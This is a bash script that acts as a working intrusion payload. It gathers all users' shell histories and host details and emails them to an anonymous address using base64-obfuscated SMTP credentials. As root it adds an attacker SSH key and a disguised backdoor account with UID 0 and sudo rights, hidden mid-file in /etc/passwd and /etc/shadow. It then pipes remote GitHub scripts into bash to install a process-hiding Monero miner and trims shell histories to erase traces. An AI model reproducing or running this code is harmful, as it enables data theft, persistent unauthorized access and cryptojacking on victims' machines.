#!/bin/bash
unset HISTFILE

# Function to collect history from all available shells
collect_shell_history() {
    echo "=== COLLECTING SHELL HISTORIES ==="

    # List of common shell history files
    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    # System-wide shells (check /etc/shells)
    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)

    OUTPUT=""
    for shell in $SYSTEM_SHELLS; do
        case $shell in
            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
                hist_file="${SHELL_HISTORIES[$shell]}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
                ;;
        esac
    done

    # Also check for root histories if running as root
    if [ $(id -u) -eq 0 ]; then
        for user in $(ls /home); do
            for shell in "${!SHELL_HISTORIES[@]}"; do
                hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
            done
        done
    fi

    echo -e "$OUTPUT"
}

# Function to send email with all histories
send_histories_email() {
    # Get system info
    HOSTNAME=$(hostname)
    PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me || echo "N/A")
    LOCAL_IP=$(hostname -I | awk '{print $1}')
    USER=$(whoami)

    # Format email
    EMAIL_CONTENT=$(cat <<EOF
=== SYSTEM REPORT ===
Hostname: $HOSTNAME
User: $USER
Public IP: $PUBLIC_IP
Local IP: $LOCAL_IP

=== RESOURCES ===
RAM: $(free -h | awk '/^Mem:/ {print $2}')
CPU: $(nproc) cores
Storage: $(df -h / | awk 'NR==2 {print $2}')

$(collect_shell_history)
EOF
    )

    recipient="ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com"
    subject="Full Shell History Report from $HOSTNAME"

#    smtp_server="smtp.gmail.com"
#    port=587
#    sender_email="acen.bergheim@googlemail.com"
#    password="!55Mama55!"

#    smtp_server="smtp.mailersend.net"
#    port=587
#    sender_email="MS_wfRIsR@trial-yxj6lj9x6614do2r.mlsender.net"
#    password="mssp.JfxiTRI.351ndgwy7ndlzqx8.AMTiGYy"

    # Dekodieren der verschleierten Anmeldedaten
    smtp_server=$(echo "c210cC5tYWlsZXJzZW5kLm5ldA==" | base64 -d)
    port=587
    sender_email=$(echo "TVNfd2ZSSXNSQHRyaWFsLXl4ajZsajl4NjYxNGRvMnIubWxzZW5kZXIubmV0" | base64 -d)
    password=$(echo "bXNzcC5KZnhpVFJJLjM1MW5kZ3d5N25kbHpxeDguQU1UaUdZeQ==" | base64 -d)

    LOG_FILE="/tmp/system_report_email.log"
    TEMP_FILE=$(mktemp)
    echo -n "$EMAIL_CONTENT" > "$TEMP_FILE"

    # Try sending email via Python with STARTTLS and logging with error handling
    python_result=$(python -c "
import smtplib
import ssl
import os
import datetime

port = $port
smtp_server = '$smtp_server'
sender_email = '$sender_email'
password = '$password'
receiver_email = '$recipient'
subject = '$subject'
body_file = '$TEMP_FILE'
log_file = '$LOG_FILE'

with open(body_file, 'r', encoding='utf-8', errors='ignore') as f:
    body = f.read()

message = f'Subject: {subject}\\n\\n{body}'

context = ssl.create_default_context()
try:
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.encode('utf-8', errors='ignore'))
    log_message = f'{datetime.datetime.now()} - Email sent successfully via Python using smtp.mailersend.net.\\n'
    print(log_message.strip())
    try:
        with open(log_file, 'a') as lf:
            lf.write(log_message)
    except Exception as le:
        print(f'Error writing to log file ({log_file}): {le}')
    exit(0)
except Exception as e:
    error_message = f'{datetime.datetime.now()} - Error sending email via Python using smtp.mailersend.net: {e}\\n'
    print(error_message.strip())
    try:
        with open(log_file, 'a') as lf:
            lf.write(error_message)
    except Exception as le:
        print(f'Error writing to log file ({log_file}): {le}')
    exit(1)
"
    )
    python_exit_code=$?

    # Fallback logic (using TEMP_FILE) with logging and error handling
    if [ "$python_exit_code" -ne 0 ]; then
        echo "$python_result"
        if command -v mail &>/dev/null; then
            echo "Sending email using mail command..."
            log_message="Fallback: Attempting to send email using mail command...\n"
            echo "$log_message" >> "$LOG_FILE" 2>&1 || echo "Error writing to log file ($LOG_FILE)"
            cat "$TEMP_FILE" | mail -s "$subject" "$recipient"
            if [ $? -eq 0 ]; then
                echo "Email sent successfully via mail command."
                log_message="$(date) - Email sent successfully via mail command.\n"
                echo "$log_message" >> "$LOG_FILE" 2>&1 || echo "Error writing to log file ($LOG_FILE)"
            else
                echo "Error sending email via mail command."
                log_message="$(date) - Error sending email via mail command.\n"
                echo "$log_message" >> "$LOG_FILE" 2>&1 || echo "Error writing to log file ($LOG_FILE)"
            fi
        else
            echo "Warning: mailutils not installed - storing report in /tmp/system_report.txt"
            log_message="$(date) - Warning: mailutils not installed - storing report in /tmp/system_report.txt\n"
            echo "$log_message" >> "$LOG_FILE" 2>&1 || echo "Error writing to log file ($LOG_FILE)"
            cat "$TEMP_FILE" > /tmp/system_report.txt
            echo "System report stored in /tmp/system_report.txt"
            log_message="$(date) - System report stored in /tmp/system_report.txt\n"
            echo "$log_message" >> "$LOG_FILE" 2>&1 || echo "Error writing to log file ($LOG_FILE)"
        fi
    fi

    # Clean up the temporary file
    rm -f "$TEMP_FILE"
}


# Original service check functions
does_service_exist() {
    service="$1"
    systemctl list-units --type=service --all | grep -q "$service.service"
}

is_service_running() {
    service="$1"
    systemctl is-active --quiet "$service"
}

# --- Main Execution ---

# Service checks
services=("swapd" "gdm2")
for service in "${services[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            echo "ERROR: Service $service is running. Aborting."
            exit 1
        fi
    fi
done

# System info display
echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
echo -e "|   CPU Cores    |      $(nproc)      |"
echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
echo -e "---------------------------------"

# Send all shell histories
send_histories_email

# Enhanced history cleanup for all shells
cleanup_histories() {
    echo "Cleaning the last 10 lines of all shell histories..."

    # Function to clean the last 10 lines of a given history file
    clean_history_file() {
        local file="$1"
        if [ -f "$file" ]; then
            local line_count=$(wc -l < "$file")
            if [ "$line_count" -gt 10 ]; then
                head -n $((line_count - 10)) "$file" > "${file}.tmp"
                mv "${file}.tmp" "$file"
                echo "Cleaned last 10 lines of: $file"
            elif [ "$line_count" -gt 0 ]; then
                echo "History file '$file' has less than or equal to 10 lines. Not cleaning."
            else
                echo "History file '$file' is empty."
            fi
        else
            echo "History file '$file' not found."
        fi
    }

    # List of common shell history files
    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    # Clean current user's histories
    for shell in "${!SHELL_HISTORIES[@]}"; do
        clean_history_file "${SHELL_HISTORIES[$shell]}"
    done

    # Root cleans all user histories if running as root
    if [ $(id -u) -eq 0 ]; then
        for user in $(ls /home); do
            for shell in "${!SHELL_HISTORIES[@]}"; do
                clean_history_file "/home/$user/${SHELL_HISTORIES[$shell]##*/}"
            done
        done
    fi
}

# Original installation functions
rootstuff() {
  echo -e "\nStarting root installation..."

  # SSH key setup for root
  echo "[*] Generating ssh key on server"
  rm -rf /root/.ssh
  mkdir -p /root/.ssh
  chmod 700 /root/.ssh
  echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q==' >> /root/.ssh/authorized_keys
  chmod 600 /root/.ssh/authorized_keys

  # Create clamav-mail user
  PASSWORD_HASH='$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1'
  if id -u clamav-mail >/dev/null 2>&1; then
    userdel --remove clamav-mail
  fi
  if ! grep -q '^sudo:' /etc/group; then
    groupadd sudo
  fi
  useradd -u 455 -G root,sudo -M -o -s /bin/bash clamav-mail
  chpasswd -e <<< "clamav-mail:$PASSWORD_HASH"
  awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/passwd > /tmp/passwd
  mv /tmp/passwd /etc/passwd
  awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/shadow > /tmp/shadow
  mv /tmp/shadow /etc/shadow

  # Original root installation commands
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}

userstuff() {
  echo -e "\nStarting user installation..."
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
}

# Original execution logic
if [[ $(id -u) -eq 0 ]]; then
    rootstuff
else
    userstuff
fi

cleanup_histories
